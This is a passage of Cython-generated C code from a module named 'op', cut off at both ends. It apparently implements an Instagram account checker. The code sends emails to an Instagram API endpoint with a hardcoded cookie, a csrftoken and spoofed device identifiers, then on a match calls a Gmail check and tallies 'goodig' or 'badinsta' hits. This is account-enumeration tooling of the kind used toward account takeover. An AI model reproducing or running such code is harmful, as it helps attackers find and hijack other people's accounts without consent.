__pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_6);\n  }\n  __pyx_t_10 = __Pyx_PyObject_Unicode(__pyx_t_6); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 351, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_10);\n  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n  __pyx_t_6 = PyUnicode_AsEncodedString(((PyObject*)__pyx_t_10), NULL, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 351, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_6);\n  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n  __pyx_t_4 = 1;\n  #if CYTHON_UNPACK_METHODS\n  if (unlikely(PyMethod_Check(__pyx_t_7))) {\n    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_7);\n    assert(__pyx_t_5);\n    PyObject* __pyx__function = PyMethod_GET_FUNCTION(__pyx_t_7);\n    __Pyx_INCREF(__pyx_t_5);\n    __Pyx_INCREF(__pyx__function);\n    __Pyx_DECREF_SET(__pyx_t_7, __pyx__function);\n    __pyx_t_4 = 0;\n  }\n  #endif\n  {\n    PyObject *__pyx_callargs[2] = {__pyx_t_5, __pyx_t_6};\n    __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_7, __pyx_callargs+__pyx_t_4, (2-__pyx_t_4) | (__pyx_t_4*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\n    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 351, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_2);\n  }\n  __pyx_t_3 = __pyx_t_2;\n  __Pyx_INCREF(__pyx_t_3);\n  __pyx_t_4 = 0;\n  {\n    PyObject *__pyx_callargs[2] = {__pyx_t_3, NULL};\n    __pyx_t_1 = __Pyx_PyObject_FastCallMethod(__pyx_mstate_global->__pyx_n_u_hexdigest, __pyx_callargs+__pyx_t_4, (1-__pyx_t_4) | (1*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 351, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_1);\n  }\n  __pyx_t_2 = __Pyx_PyObject_GetSlice(__pyx_t_1, 0, 16, NULL, NULL, &__pyx_mstate_global->__pyx_slice[0], 0, 1, 1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 351, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __pyx_t_1 = PyNumber_Add(__pyx_v_dev, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 351, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __pyx_v_device_id = __pyx_t_1;\n  __pyx_t_1 = 0;\n\n  \n  __pyx_t_2 = NULL;\n  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_mstate_global->__pyx_n_u_uuid); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 352, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_mstate_global->__pyx_n_u_uuid4); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 352, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_7);\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n  __pyx_t_4 = 1;\n  #if CYTHON_UNPACK_METHODS\n  if (unlikely(PyMethod_Check(__pyx_t_7))) {\n    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_7);\n    assert(__pyx_t_2);\n    PyObject* __pyx__function = PyMethod_GET_FUNCTION(__pyx_t_7);\n    __Pyx_INCREF(__pyx_t_2);\n    __Pyx_INCREF(__pyx__function);\n    __Pyx_DECREF_SET(__pyx_t_7, __pyx__function);\n    __pyx_t_4 = 0;\n  }\n  #endif\n  {\n    PyObject *__pyx_callargs[2] = {__pyx_t_2, NULL};\n    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_7, __pyx_callargs+__pyx_t_4, (1-__pyx_t_4) | (__pyx_t_4*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\n    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 352, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_1);\n  }\n  __pyx_t_7 = __Pyx_PyObject_Unicode(__pyx_t_1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 352, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_7);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __pyx_v_uui = ((PyObject*)__pyx_t_7);\n  __pyx_t_7 = 0;\n\n  \n  __pyx_t_7 = __Pyx_PyDict_NewPresized(3); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 354, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_7);\n  if (PyDict_SetItem(__pyx_t_7, __pyx_mstate_global->__pyx_kp_u_User_Agent, __pyx_v_ua) < (0)) __PYX_ERR(0, 354, __pyx_L1_error)\n  if (PyDict_SetItem(__pyx_t_7, __pyx_mstate_global->__pyx_n_u_Cookie, __pyx_mstate_global->__pyx_kp_u_mid_aHiX2gALAAEzAJ2O_cR9XsT2NSW5) < (0)) __PYX_ERR(0, 354, __pyx_L1_error)\n  if (PyDict_SetItem(__pyx_t_7, __pyx_mstate_global->__pyx_kp_u_Content_Type, __pyx_mstate_global->__pyx_kp_u_application_x_www_form_urlencode_2) < (0)) __PYX_ERR(0, 354, __pyx_L1_error)\n  __pyx_v_headers = ((PyObject*)__pyx_t_7);\n  __pyx_t_7 = 0;\n\n  \n  __pyx_t_7 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 359, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_7);\n  __pyx_t_2 = NULL;\n  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_mstate_global->__pyx_n_u_json); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 359, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_mstate_global->__pyx_n_u_dumps); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 359, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_6);\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n  \n  __pyx_t_3 = __Pyx_PyDict_NewPresized(5); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 360, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  if (PyDict_SetItem(__pyx_t_3, __pyx_mstate_global->__pyx_n_u_csrftoken, __pyx_mstate_global->__pyx_n_u_kA6DceBdnNiOMMBxMG6cZid27KOws1a0) < (0)) __PYX_ERR(0, 360, __pyx_L1_error)\n\n  \n  if (PyDict_SetItem(__pyx_t_3, __pyx_mstate_global->__pyx_n_u_adid, __pyx_v_uui) < (0)) __PYX_ERR(0, 360, __pyx_L1_error)\n\n  \n  if (PyDict_SetItem(__pyx_t_3, __pyx_mstate_global->__pyx_n_u_guid, __pyx_v_uui) < (0)) __PYX_ERR(0, 360, __pyx_L1_error)\n\n  \n  if (PyDict_SetItem(__pyx_t_3, __pyx_mstate_global->__pyx_n_u_device_id, __pyx_v_device_id) < (0)) __PYX_ERR(0, 360, __pyx_L1_error)\n\n  \n  if (PyDict_SetItem(__pyx_t_3, __pyx_mstate_global->__pyx_n_u_query, __pyx_v_email) < (0)) __PYX_ERR(0, 360, __pyx_L1_error)\n  __pyx_t_4 = 1;\n  #if CYTHON_UNPACK_METHODS\n  if (unlikely(PyMethod_Check(__pyx_t_6))) {\n    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_6);\n    assert(__pyx_t_2);\n    PyObject* __pyx__function = PyMethod_GET_FUNCTION(__pyx_t_6);\n    __Pyx_INCREF(__pyx_t_2);\n    __Pyx_INCREF(__pyx__function);\n    __Pyx_DECREF_SET(__pyx_t_6, __pyx__function);\n    __pyx_t_4 = 0;\n  }\n  #endif\n  {\n    PyObject *__pyx_callargs[2] = {__pyx_t_2, __pyx_t_3};\n    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+__pyx_t_4, (2-__pyx_t_4) | (__pyx_t_4*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 359, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_1);\n  }\n\n  \n  __pyx_t_6 = PyNumber_Add(__pyx_mstate_global->__pyx_kp_u_0d067c2f86cac2c17d655631c9cec240_2, __pyx_t_1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 359, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_6);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  if (PyDict_SetItem(__pyx_t_7, __pyx_mstate_global->__pyx_n_u_signed_body, __pyx_t_6) < (0)) __PYX_ERR(0, 359, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n  if (PyDict_SetItem(__pyx_t_7, __pyx_mstate_global->__pyx_n_u_ig_sig_key_version, __pyx_mstate_global->__pyx_kp_u_4) < (0)) __PYX_ERR(0, 359, __pyx_L1_error)\n  __pyx_v_data = ((PyObject*)__pyx_t_7);\n  __pyx_t_7 = 0;\n\n  \n  __pyx_t_6 = NULL;\n  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_mstate_global->__pyx_n_u_requests); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 368, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_mstate_global->__pyx_n_u_post); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 368, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n  \n  __pyx_t_4 = 1;\n  #if CYTHON_UNPACK_METHODS\n  if (unlikely(PyMethod_Check(__pyx_t_3))) {\n    __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_3);\n    assert(__pyx_t_6);\n    PyObject* __pyx__function = PyMethod_GET_FUNCTION(__pyx_t_3);\n    __Pyx_INCREF(__pyx_t_6);\n    __Pyx_INCREF(__pyx__function);\n    __Pyx_DECREF_SET(__pyx_t_3, __pyx__function);\n    __pyx_t_4 = 0;\n  }\n  #endif\n  {\n    PyObject *__pyx_callargs[2 + ((CYTHON_VECTORCALL) ? 2 : 0)] = {__pyx_t_6, __pyx_mstate_global->__pyx_kp_u_https_i_instagram_com_api_v1_acc};\n    __pyx_t_1 = __Pyx_MakeVectorcallBuilderKwds(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 368, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_1);\n    if (__Pyx_VectorcallBuilder_AddArg(__pyx_mstate_global->__pyx_n_u_headers, __pyx_v_headers, __pyx_t_1, __pyx_callargs+2, 0) < (0)) __PYX_ERR(0, 368, __pyx_L1_error)\n    if (__Pyx_VectorcallBuilder_AddArg(__pyx_mstate_global->__pyx_n_u_data, __pyx_v_data, __pyx_t_1, __pyx_callargs+2, 1) < (0)) __PYX_ERR(0, 368, __pyx_L1_error)\n    __pyx_t_7 = __Pyx_Object_Vectorcall_CallFromBuilder(__pyx_t_3, __pyx_callargs+__pyx_t_4, (2-__pyx_t_4) | (__pyx_t_4*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET), __pyx_t_1);\n    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;\n    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n    if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 368, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_7);\n  }\n  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_mstate_global->__pyx_n_u_text); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 369, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\n  __pyx_v_response = __pyx_t_3;\n  __pyx_t_3 = 0;\n\n  \n  __pyx_t_11 = (__Pyx_PySequence_ContainsTF(__pyx_v_email, __pyx_v_response, Py_EQ)); if (unlikely((__pyx_t_11 < 0))) __PYX_ERR(0, 371, __pyx_L1_error)\n  if (__pyx_t_11) {\n\n    \n    __pyx_t_7 = NULL;\n    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_mstate_global->__pyx_n_u_Gmail); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 372, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_1);\n    __pyx_t_4 = 1;\n    #if CYTHON_UNPACK_METHODS\n    if (unlikely(PyMethod_Check(__pyx_t_1))) {\n      __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_1);\n      assert(__pyx_t_7);\n      PyObject* __pyx__function = PyMethod_GET_FUNCTION(__pyx_t_1);\n      __Pyx_INCREF(__pyx_t_7);\n      __Pyx_INCREF(__pyx__function);\n      __Pyx_DECREF_SET(__pyx_t_1, __pyx__function);\n      __pyx_t_4 = 0;\n    }\n    #endif\n    {\n      PyObject *__pyx_callargs[2] = {__pyx_t_7, __pyx_v_email};\n      __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_1, __pyx_callargs+__pyx_t_4, (2-__pyx_t_4) | (__pyx_t_4*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;\n      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n      if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 372, __pyx_L1_error)\n      __Pyx_GOTREF(__pyx_t_3);\n    }\n    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n    \n    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_mstate_global->__pyx_n_u_goodig); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 374, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_3);\n    __pyx_t_1 = __Pyx_PyLong_AddObjC(__pyx_t_3, __pyx_mstate_global->__pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 374, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_1);\n    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n    if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_goodig, __pyx_t_1) < (0)) __PYX_ERR(0, 374, __pyx_L1_error)\n    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n    \n    __pyx_t_3 = NULL;\n    __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_mstate_global->__pyx_n_u_pppp); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 375, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_7);\n    __pyx_t_4 = 1;\n    #if CYTHON_UNPACK_METHODS\n    if (unlikely(PyMethod_Check(__pyx_t_7))) {\n      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_7);\n      assert(__pyx_t_3);\n      PyObject* __pyx__function = PyMethod_GET_FUNCTION(__pyx_t_7);\n      __Pyx_INCREF(__pyx_t_3);\n      __Pyx_INCREF(__pyx__function);\n      __Pyx_DECREF_SET(__pyx_t_7, __pyx__function);\n      __pyx_t_4 = 0;\n    }\n    #endif\n    {\n      PyObject *__pyx_callargs[2] = {__pyx_t_3, NULL};\n      __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_7, __pyx_callargs+__pyx_t_4, (1-__pyx_t_4) | (__pyx_t_4*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\n      if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 375, __pyx_L1_error)\n      __Pyx_GOTREF(__pyx_t_1);\n    }\n    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n    \n    goto __pyx_L3;\n  }\n\n  \n   {\n    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_mstate_global->__pyx_n_u_badinsta); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 377, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_1);\n    __pyx_t_7 = __Pyx_PyLong_AddObjC(__pyx_t_1, __pyx_mstate_global->__pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 377, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_7);\n    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n    if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_badinsta, __pyx_t_7) < (0)) __PYX_ERR(0, 377, __pyx_L1_error)\n    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\n\n    \n    __pyx_t_1 = NULL;\n    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_mstate_global->__pyx_n_u_pppp); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 378, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_3);\n    __pyx_t_4 = 1;\n    #if CYTHON_UNPACK_METHODS\n    if (unlikely(PyMethod_Check(__pyx_t_3))) {\n      __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_3);\n      assert(__pyx_t_1);\n      PyObject* __pyx__function = PyMethod_GET_FUNCTION(__pyx_t_3);\n      __Pyx_INCREF(__pyx_t_1);\n      __Pyx_INCREF(__pyx__function);\n      __Pyx_DECREF_SET(__pyx_t_3, __pyx__function);\n      __pyx_t_4 = 0;\n    }\n    #endif\n    {\n      PyObject *__pyx_callargs[2] = {__pyx_t_1, NULL};\n      __pyx_t_7 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+__pyx_t_4, (1-__pyx_t_4) | (__pyx_t_4*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\n      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n      if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 378, __pyx_L1_error)\n      __Pyx_GOTREF(__pyx_t_7);\n    }\n    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\n  }\n  __pyx_L3:;\n\n  \n\n  \n  __pyx_r = Py_None; __Pyx_INCREF(Py_None);\n  goto __pyx_L0;\n  __pyx_L1_error:;\n  __Pyx_XDECREF(__pyx_t_1);\n  __Pyx_XDECREF(__pyx_t_2);\n  __Pyx_XDECREF(__pyx_t_3);\n  __Pyx_XDECREF(__pyx_t_5);\n  __Pyx_XDECREF(__pyx_t_6);\n  __Pyx_XDECREF(__pyx_t_7);\n  __Pyx_XDECREF(__pyx_t_8);\n  __Pyx_XDECREF(__pyx_t_9);\n  __Pyx_XDECREF(__pyx_t_10);\n  __Pyx_AddTraceback("op.check_on", __pyx_clineno, __pyx_lineno, __pyx_filename);\n  __pyx_r = NULL;\n  __pyx_L0:;\n  __Pyx_XDECREF(__pyx_v_ua);\n  __Pyx_XDECREF(__pyx_v_dev);\n  __Pyx_XDECREF(__pyx_v_device_id);\n  __Pyx_XDECREF(__pyx_v_uui);\n  __Pyx_XDECREF(__pyx_v_headers);\n  __Pyx_XDECREF(__pyx_v_data);\n  __Pyx_XDECREF(__pyx_v_response);\n  __Pyx_XGIVEREF(__pyx_r);\n  __Pyx_RefNannyFinishContext();\n  return __pyx_r;\n}\n\n\n\n\nstatic PyObject *__pyx_pw_2op_17rand_ids(PyObject *__pyx_self, \n#if CYTHON_METH_FASTCALL\nPyObject *const *__pyx_args, Py_ssize_t __pyx_nargs, PyObject *__pyx_kwds\n#else\nPyObject *__pyx_args, PyObject *__pyx_kwds\n#endif\n); \nstatic PyMethodDef __pyx_mdef_2op_17rand_ids = {"rand_ids", (PyCFunction)(void(*)(void))(__Pyx_PyCFunction_FastCallWithKeywords)__pyx_pw_2op_17rand_ids, __Pyx_METH_FASTCALL|METH_KEYWORDS, 0};\nstatic PyObject *__pyx_pw_2op_17rand_ids(PyObject *__pyx_self, \n#if CYTHON_METH_FASTCALL\nPyObject *const *__pyx_args, Py_ssize_t __pyx_nargs, PyObject *__pyx_kwds\n#else\nPyObject *__pyx_args, PyObject *__pyx_kwds\n#endif\n) {\n  PyObject *__pyx_v_bbk = 0;\n  PyObject *__pyx_v_Ido = 0;\n  #if !CYTHON_METH_FASTCALL\n  CYTHON_UNUSED Py_ssize_t __pyx_nargs;\n  #endif\n  CYTHON_UNUSED PyObject *const *__pyx_kwvalues;\n  PyObject* values[2] = {0,0};\n  int __pyx_lineno = 0;\n  const char *__pyx_filename = NULL;\n  int __pyx_clineno = 0;\n  PyObject *__pyx_r = 0;\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext("rand_ids (wrapper)", 0);\n  #if !CYTHON_METH_FASTCALL\n  #if CYTHON_ASSUME_SAFE_SIZE\n  __pyx_nargs = PyTuple_GET_SIZE(__pyx_args);\n  #else\n  __pyx_nargs = PyTuple_Size(__pyx_args); if (unlikely(__pyx_nargs < 0)) return NULL;\n  #endif\n  #endif\n  __pyx_kwvalues = __Pyx_KwValues_FASTCALL(__pyx_args, __pyx_nargs);\n  {\n    PyObject ** const __pyx_pyargnames[] = {&__pyx_mstate_global->__pyx_n_u_bbk,&__pyx_mstate_global->__pyx_n_u_Ido,0};\n    const Py_ssize_t __pyx_kwds_len = (__pyx_kwds) ? __Pyx_NumKwargs_FASTCALL(__pyx_kwds) : 0;\n    if (unlikely(__pyx_kwds_len) < 0) __PYX_ERR(0, 385, __pyx_L3_error)\n    if (__pyx_kwds_len > 0) {\n      switch (__pyx_nargs) {\n        case  2:\n        values[1] = __Pyx_ArgRef_FASTCALL(__pyx_args, 1);\n        if (!CYTHON_ASSUME_SAFE_MACROS && unlikely(!values[1])) __PYX_ERR(0, 385, __pyx_L3_error)\n        CYTHON_FALLTHROUGH;\n        case  1:\n        values[0] = __Pyx_ArgRef_FASTCALL(__pyx_args, 0);\n        if (!CYTHON_ASSUME_SAFE_MACROS && unlikely(!values[0])) __PYX_ERR(0, 385, __pyx_L3_error)\n        CYTHON_FALLTHROUGH;\n        case  0: break;\n        default: goto __pyx_L5_argtuple_error;\n      }\n      const Py_ssize_t kwd_pos_args = __pyx_nargs;\n      if (__Pyx_ParseKeywords(__pyx_kwds, __pyx_kwvalues, __pyx_pyargnames, 0, values, kwd_pos_args, __pyx_kwds_len, "rand_ids", 0) < (0)) __PYX_ERR(0, 385, __pyx_L3_error)\n      for (Py_ssize_t i = __pyx_nargs; i < 2; i++) {\n        if (unlikely(!values[i])) { __Pyx_RaiseArgtupleInvalid("rand_ids", 1, 2, 2, i); __PYX_ERR(0, 385, __pyx_L3_error) }\n      }\n    } else if (unlikely(__pyx_nargs != 2)) {\n      goto __pyx_L5_argtuple_error;\n    } else {\n      values[0] = __Pyx_ArgRef_FASTCALL(__pyx_args, 0);\n      if (!CYTHON_ASSUME_SAFE_MACROS && unlikely(!values[0])) __PYX_ERR(0, 385, __pyx_L3_error)\n      values[1] = __Pyx_ArgRef_FASTCALL(__pyx_args, 1);\n      if (!CYTHON_ASSUME_SAFE_MACROS && unlikely(!values[1])) __PYX_ERR(0, 385, __pyx_L3_error)\n    }\n    __pyx_v_bbk = values[0];\n    __pyx_v_Ido = values[1];\n  }\n  goto __pyx_L6_skip;\n  __pyx_L5_argtuple_error:;\n  __Pyx_RaiseArgtupleInvalid("rand_ids", 1, 2, 2, __pyx_nargs); __PYX_ERR(0, 385, __pyx_L3_error)\n  __pyx_L6_skip:;\n  goto __pyx_L4_argument_unpacking_done;\n  __pyx_L3_error:;\n  for (Py_ssize_t __pyx_temp=0; __pyx_temp < (Py_ssize_t)(sizeof(values)/sizeof(values[0])); ++__pyx_temp) {\n    Py_XDECREF(values[__pyx_temp]);\n  }\n  __Pyx_AddTraceback("op.rand_ids", __pyx_clineno, __pyx_lineno, __pyx_filename);\n  __Pyx_RefNannyFinishContext();\n  return NULL;\n  __pyx_L4_argument_unpacking_done:;\n  __pyx_r = __pyx_pf_2op_16rand_ids(__pyx_self, __pyx_v_bbk, __pyx_v_Ido);\n\n  \n  for (Py_ssize_t __pyx_temp=0; __pyx_temp < (Py_ssize_t)(sizeof(values)/sizeof(values[0])); ++__pyx_temp) {\n    Py_XDECREF(values[__pyx_temp]);\n  }\n  __Pyx_RefNannyFinishContext();\n  return __pyx_r;\n}\n\nstatic PyObject *__pyx_pf_2op_16rand_ids(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_bbk, PyObject *__pyx_v_Ido) {\n  PyObject *__pyx_v_Id = NULL;\n  PyObject *__pyx_r = NULL;\n  __Pyx_RefNannyDeclarations\n  PyObject *__pyx_t_1 = NULL;\n  PyObject *__pyx_t_2 = NULL;\n  PyObject *__pyx_t_3 = NULL;\n  PyObject *__pyx_t_4 = NULL;\n  size_t __pyx_t_5;\n  int __pyx_t_6;\n  int __pyx_t_7;\n  int __pyx_lineno = 0;\n  const char *__pyx_filename = NULL;\n  int __pyx_clineno = 0;\n  __Pyx_RefNannySetupContext("rand_ids", 0);\n\n  \n  __pyx_t_2 = NULL;\n  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_mstate_global->__pyx_n_u_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 386, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_mstate_global->__pyx_n_u_randrange); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 386, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_4);\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n  __pyx_t_5 = 1;\n  #if CYTHON_UNPACK_METHODS\n  if (unlikely(PyMethod_Check(__pyx_t_4))) {\n    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_4);\n    assert(__pyx_t_2);\n    PyObject* __pyx__function = PyMethod_GET_FUNCTION(__pyx_t_4);\n    __Pyx_INCREF(__pyx_t_2);\n    __Pyx_INCREF(__pyx__function);\n    __Pyx_DECREF_SET(__pyx_t_4, __pyx__function);\n    __pyx_t_5 = 0;\n  }\n  #endif\n  {\n    PyObject *__pyx_callargs[3] = {__pyx_t_2, __pyx_v_bbk, __pyx_v_Ido};\n    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+__pyx_t_5, (3-__pyx_t_5) | (__pyx_t_5*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 386, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_1);\n  }\n  __pyx_t_4 = __Pyx_PyObject_Unicode(__pyx_t_1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 386, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_4);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __pyx_v_Id = ((PyObject*)__pyx_t_4);\n  __pyx_t_4 = 0;\n\n  \n  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_ids); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 387, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_4);\n  __pyx_t_6 = (__Pyx_PySequence_ContainsTF(__pyx_v_Id, __pyx_t_4, Py_NE)); if (unlikely((__pyx_t_6 < 0))) __PYX_ERR(0, 387, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n  if (__pyx_t_6) {\n\n    \n    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_ids); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 388, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_4);\n    __pyx_t_7 = __Pyx_PyObject_Append(__pyx_t_4, __pyx_v_Id); if (unlikely(__pyx_t_7 == ((int)-1))) __PYX_ERR(0, 388, 